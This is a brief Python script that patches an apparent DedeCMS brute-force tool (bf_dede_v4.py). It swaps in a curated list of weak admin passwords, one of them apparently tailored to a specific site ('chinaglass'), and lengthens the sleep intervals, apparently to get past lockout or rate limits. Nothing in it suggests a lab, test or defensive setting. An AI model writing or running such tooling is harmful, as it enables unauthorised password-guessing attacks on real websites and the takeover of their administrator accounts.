#!/usr/bin/env python3
"""patch_v4.py - 修改bf_dede_v4.py: 精选密码+长冷却"""
import re

p = '/tmp/bf_dede_v4.py'
src = open(p).read()

# 精选密码
top = '["admin", "admin123", "123456", "admin888", "chinaglass", "dedecms", "admin666", "12345678", "Admin123", "admin@123", "a123456"]'
src = re.sub(r'PASSWORDS = \[.*?\]', 'PASSWORDS = ' + top, src, flags=re.S)

# 冷却时间
src = src.replace('time.sleep(60)', 'time.sleep(300)')
src = src.replace('time.sleep(30)', 'time.sleep(300)')
src = src.replace('time.sleep(3)', 'time.sleep(8)')

open(p, 'w').write(src)
print('patched, PASSWORDS:', re.findall(r'PASSWORDS = (\[.*?\])', src, re.S)[0][:80])
